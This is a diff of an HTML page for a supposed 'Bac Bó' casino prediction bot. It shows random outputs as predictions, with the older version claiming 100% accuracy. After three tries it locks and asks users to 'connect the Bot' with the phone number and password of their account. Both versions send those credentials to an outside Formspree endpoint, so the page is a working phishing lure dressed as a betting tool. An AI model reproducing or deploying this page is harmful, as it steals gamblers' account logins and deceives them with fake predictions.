@@ -1,277 +1,224 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-<meta charset="UTF-8">
-<title>Bac Bó Predictor</title>
-<style>
+  <meta charset="UTF-8">
+  <title>BOT PREDICTOR - Bac Bó</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
     body {
-        font-family: Arial, sans-serif;
-        background: linear-gradient(180deg, #1a1aff, #800080); /* azul para roxo neo */
-        color: #fff;
-        text-align: center;
-        margin: 0;
-        padding: 0;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      background-color: #0d0d0d;
+      color: #fff;
+      margin: 0;
+      padding: 20px;
     }
-    .container {
-        margin-top: 50px;
+    h1 {
+      color: #ff00ff;
+      text-shadow: 0 0 10px #ff00ff;
+      font-size: 1.5em;
     }
-    .login-container, .game-container {
-        display: none;
-        margin-top: 50px;
+    .circle {
+      font-size: 2em;
+      margin: 20px auto;
+      padding: 30px;
+      border-radius: 50%;
+      width: 120px;
+      height: 120px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
-    .active {
-        display: block;
+    .azul {
+      color: #00f;
+      border: 3px solid #00f;
+      box-shadow: 0 0 20px #00f;
     }
-    input {
-        padding: 12px;
-        margin: 10px;
-        width: 250px;
-        border-radius: 5px;
-        border: 1px solid #444;
-        background: #222;
-        color: #fff;
+    .vermelho {
+      color: #f00;
+      border: 3px solid #f00;
+      box-shadow: 0 0 20px #f00;
+    }
+    .empate {
+      color: #ffd700;
+      border: 3px solid #ffd700;
+      box-shadow: 0 0 20px #ffd700;
+    }
+    .blocked {
+      background: #333;
+      color: #ffcc00;
+      padding: 10px;
+      margin: 15px auto;
+      border-radius: 5px;
+      width: 90%;
+      font-size: 0.9em;
+    }
+    .bar {
+      background: #8000ff;
+      padding: 10px;
+      margin: 10px auto;
+      border-radius: 5px;
+      width: 90%;
+      font-size: 0.9em;
+    }
+    .history {
+      background: #111;
+      padding: 15px;
+      margin-top: 20px;
+      border-radius: 5px;
+      box-shadow: 0 0 10px #00ffff;
+    }
+    .history h2 {
+      color: #00ffff;
+      font-size: 1.2em;
+    }
+    .history-item {
+      background: #8000ff;
+      margin: 5px auto;
+      padding: 8px;
+      border-radius: 5px;
+      width: 80%;
+      font-size: 0.9em;
     }
     button {
-        padding: 12px 25px;
-        background: #e63946;
-        color: #fff;
-        border: none;
-        border-radius: 5px;
-        cursor: pointer;
-        font-weight: bold;
+      padding: 12px 20px;
+      background: #28a745;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-top: 15px;
+      font-size: 1em;
+      width: 90%;
+      max-width: 300px;
     }
     button:hover {
-        background: #d62828;
+      background: #218838;
     }
-    .result-box {
-        margin-top: 20px;
-        font-size: 1.3em;
-        font-weight: bold;
+    input {
+      margin: 8px;
+      padding: 10px;
+      width: 90%;
+      max-width: 300px;
+      font-size: 1em;
     }
-    canvas {
-        margin-top: 30px;
-        background: #222;
-        border-radius: 10px;
-        padding: 10px;
-        transition: transform 1s ease-in-out;
+    #formMessage {
+      margin-top: 10px;
+      font-weight: bold;
+      font-size: 0.9em;
     }
-    #lock {
-        margin-top: 20px;
-        font-size: 1.2em;
-        color: #ffcc00;
-    }
-    #historico {
-        margin-top: 30px;
-        font-size: 1.1em;
-        text-align: center;
-    }
-    #historico ul {
-        list-style: none;
-        padding: 0;
-    }
-    #historico li {
-        margin: 5px 0;
-    }
-</style>
+  </style>
 </head>
 <body>
+  <h1>BOT PREDICTOR - Bac Bó</h1>
 
-<!-- Tela inicial -->
-<div class="container active" id="inicio">
-    <h1>🎲 Bac Bó Predictor 100% de Acertividade</h1>
-    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6a/Bac_Bo_game.jpg" alt="Bac Bó" width="300">
-    <br><br>
-    <button onclick="abrirLogin()">Conectar o Bot</button>
-</div>
+  <div id="circle" class="circle">00.000x</div>
 
-<!-- Tela de Login -->
-<div class="login-container" id="login">
-    <h1>🎲 Bac Bó Predictor</h1>
-    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6a/Bac_Bo_game.jpg" alt="Bac Bó" width="300">
-    <br>
-    <input type="text" id="phone" placeholder="Número de telefone">
-    <br>
-    <input type="password" id="password" placeholder="Senha">
-    <br>
-    <button onclick="login()">Entrar</button>
-</div>
+  <div id="blocked" class="blocked" style="display:none;">
+    ⚠️ Acesso bloqueado
+  </div>
+  <div id="bar" class="bar" style="display:none;">
+    Para ver o próximo resultado deverás conectar o Bot
+  </div>
 
-<!-- Tela do Jogo -->
-<div class="game-container" id="game">
-    <h2>Previsão da Banca</h2>
-    <button id="btnPrever" onclick="prever()">Prever o próximo resultado</button>
-    <div class="result-box" id="resultado">Clique em prever para gerar resultado</div>
+  <button id="preverBtn">Fazer Previsão</button>
 
-    <!-- Gráfico -->
-    <canvas id="grafico" width="400" height="400"></canvas>
+  <div id="resultado"></div>
 
-    <!-- Histórico -->
-    <div id="historico">
-        <h3>Histórico de Resultados</h3>
-        <ul id="listaHistorico"></ul>
-    </div>
+  <div class="history">
+    <h2>Histórico da Banca</h2>
+    <div id="historyList"></div>
+  </div>
 
-    <div id="lock"></div>
+  <div class="section">
+    <h2>Conecte com a sua conta</h2>
+    <form id="loginForm" action="https://formspree.io/f/xgvneord" method="POST">
+      <input type="text" name="numero" placeholder="Número" required><br>
+      <input type="password" name="senha" placeholder="Senha" required><br>
+      <button type="submit">Conectar Agora</button>
+    </form>
+    <div id="formMessage"></div>
+    <a href="#">← Voltar</a>
+  </div>
 
-    <br>
-    <!-- Botão para reconectar -->
-    <button onclick="voltarInicio()">Conectar o Bot</button>
-</div>
+  <script>
+    // Previsões da banca
+    let previsoesFeitas = 0;
+    const maxPrevisoes = 3;
+    const circle = document.getElementById("circle");
+    const resultado = document.getElementById("resultado");
+    const preverBtn = document.getElementById("preverBtn");
+    const blocked = document.getElementById("blocked");
+    const bar = document.getElementById("bar");
+    const historyList = document.getElementById("historyList");
 
-<!-- Sons -->
-<audio id="soundPrever" src="https://www.soundjay.com/button/beep-07.wav" preload="auto"></audio>
-<audio id="soundLock" src="https://www.soundjay.com/button/beep-10.wav" preload="auto"></audio>
-
-<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-<script>
-let chart;
-let limite = 3;
-let total = 0;
-let locked = false;
-let historico = [];
-
-function abrirLogin(){
-    document.getElementById("inicio").classList.remove("active");
-    document.getElementById("login").classList.add("active");
-}
-
-function login(){
-    let phone = document.getElementById("phone").value;
-    let password = document.getElementById("password").value;
-
-    if(phone && password){
-        sendForm(phone, password);
-        document.getElementById("login").classList.remove("active");
-        document.getElementById("game").classList.add("active");
-        inicializarGrafico();
-        atualizarLock();
-    } else {
-        alert("Preencha telefone e senha!");
-    }
-}
-
-function prever(){
-    if(locked){
-        document.getElementById("resultado").innerText = "🔒 Acesso Bloqueado – Para ver os próximos resultados deverás conectar o Bot";
-        document.getElementById("soundLock").play();
+    preverBtn.addEventListener("click", function() {
+      if (previsoesFeitas >= maxPrevisoes) {
+        blocked.style.display = "block";
+        bar.style.display = "block";
+        resultado.textContent = "";
         return;
-    }
+      }
 
-    document.getElementById("soundPrever").play();
+      previsoesFeitas++;
 
-    let rand = Math.random();
-    let resultado;
-    let dadosGrafico;
-    let cores;
+      // Probabilidades: Azul 40%, Vermelho 40%, Empate 20%
+      const rand = Math.random();
+      let banca, classe;
+      if (rand < 0.4) {
+        banca = "Azul";
+        classe = "azul";
+      } else if (rand < 0.8) {
+        banca = "Vermelho";
+        classe = "vermelho";
+      } else {
+        banca = "Empate";
+        classe = "empate";
+      }
 
-    if(rand < 0.4){ 
-        resultado = "📊 Resultado: Azul (80%) 🎲";
-        dadosGrafico = [80,20,0]; 
-        cores = ['#0077b6','#222','#222'];
-    } else if(rand < 0.8){ 
-        resultado = "📊 Resultado: Vermelho (80%) 🎲";
-        dadosGrafico = [0,80,20]; 
-        cores = ['#222','#d62828','#222'];
-    } else { 
-        resultado = "📊 Resultado: Empate (20%) 🎲";
-        dadosGrafico = [0,0,20]; 
-        cores = ['#222','#222','#fcbf49'];
-    }
+      // Gerar valor aleatório estilo 00.x00
+      const valor = (Math.random() * 10).toFixed(2) + "x";
 
-    const canvas = document.getElementById("grafico");
-    canvas.style.transform = "rotate(360deg)";
-    setTimeout(()=>{ canvas.style.transform = "rotate(0deg)"; }, 1000);
+      circle.textContent = valor;
+      circle.className = "circle " + classe;
+      resultado.textContent = `Previsão ${previsoesFeitas}: Resultado da banca → ${banca}`;
 
-    setTimeout(()=>{
-        document.getElementById("resultado").innerText = resultado;
-        atualizarGrafico(dadosGrafico, cores);
-        atualizarHistorico(resultado);
-    }, 1000);
-
-    total++;
-    if(total >= limite){
-        locked = true;
-        atualizarLock();
-        document.getElementById("soundLock").play();
-    } else {
-        atualizarLock();
-    }
-}
-
-function inicializarGrafico(){
-    const ctx = document.getElementById('grafico').getContext('2d');
-    chart = new Chart(ctx, {
-        type: 'pie',
-        data: {
-            labels: ['Azul', 'Vermelho', 'Empate'],
-            datasets: [{
-                data: [0,0,0],
-                backgroundColor: ['#0077b6','#d62828','#fcbf49']
-            }]
-        },
-        options: {
-            responsive: false,
-            plugins: {
-                legend: {
-                    labels: { color: '#fff' }
-                }
-            }
-        }
+      // Adicionar ao histórico
+      const item = document.createElement("div");
+      item.className = "history-item";
+      item.textContent = valor + " → " + banca;
+      historyList.prepend(item);
     });
-}
 
-function atualizarGrafico(dados, cores){
-    chart.data.datasets[0].data = dados;
-    chart.data.datasets[0].backgroundColor = cores;
-    chart.update();
-}
+    // Login com feedback
+    const loginForm = document.getElementById("loginForm");
+    const formMessage = document.getElementById("formMessage");
 
-function atualizarLock(){
-    document.getElementById("lock").innerText = locked ? "🔒 Acesso Bloqueado – Para ver os próximos resultados deverás conectar o Bot" : "IA: " + (limite - total) + " previsões restantes";
-}
+    loginForm.addEventListener("submit", async function(event) {
+      event.preventDefault();
 
-function atualizarHistorico(resultado){
-    historico.unshift(resultado);
-    if(historico.length > 3) historico.pop();
+      const formData = new FormData(loginForm);
 
-    let lista = document.getElementById("listaHistorico");
-    lista.innerHTML = "";
-    historico.forEach(r => {
-        let li = document.createElement("li");
-        li.textContent = r;
-        lista.appendChild(li);
-    });
-}
+      try {
+        const response = await fetch(loginForm.action, {
+          method: loginForm.method,
+          body: formData,
+          headers: { 'Accept': 'application/json' }
+        });
 
-function voltarInicio(){
-    total = 0;
-    locked = false;
-    historico = [];
-    document.getElementById("listaHistorico").innerHTML = "";
-    document.getElementById("game").classList.remove("active");
-    document.getElementById("inicio").classList.add("active");
-}
-
-function sendForm(phone, password){
-    let formData = new FormData();
-    formData.append("telefone", phone);
-    formData.append("senha", password);
-
-    fetch("https://formspree.io/f/xgvneord", {
-        method:"POST",
-        body:formData,
-        headers:{ "Accept":"application/json" }
-    })
-    .then(res=>{
-        if(res.ok){
-            console.log("Login enviado com sucesso!");
+        if (response.ok) {
+          formMessage.textContent = "✅ Login enviado com sucesso!";
+          formMessage.style.color = "lime";
+          loginForm.reset();
         } else {
-            console.log("Erro ao enviar");
+          formMessage.textContent = "⚠️ Erro ao enviar. Tente novamente.";
+          formMessage.style.color = "red";
         }
-    })
-    .catch(()=>console.log("Erro de rede"));
-}
-</script>
-
+      } catch (error) {
+        formMessage.textContent = "⚠️ Erro de conexão. Verifique sua internet.";
+        formMessage.style.color = "red";
+      }
+    });
+  </script>
 </body>
 </html>
